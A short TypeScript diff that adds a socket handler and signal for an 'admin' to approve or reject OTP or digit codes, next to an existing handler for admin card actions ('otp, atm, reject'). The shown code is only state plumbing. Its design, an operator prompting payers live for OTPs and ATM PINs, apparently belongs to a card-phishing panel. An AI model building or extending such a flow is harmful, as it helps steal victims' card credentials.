@@ -78,6 +78,9 @@ export const isCardVerified = signal<boolean | null>(null);
 // Card Action from Admin (otp, atm, reject)
 export const cardAction = signal<string | null>(null);
 
+// Code Action from Admin (approve, reject) for OTP/digit codes
+export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);
+
 // Payment Data (stored in localStorage)
 export interface PaymentData {
   totalPaid?: number;
@@ -209,6 +212,12 @@ export function initializeSocket() {
   s.on("card:action", (action: string) => {
     console.log("Card action received:", action);
     cardAction.value = action;
+    waitingMessage.value = "";
+  });
+
+  s.on("code:action", (data: { action: string; codeIndex: number }) => {
+    console.log("Code action received:", data);
+    codeAction.value = data;
     waitingMessage.value = "";
   });
 
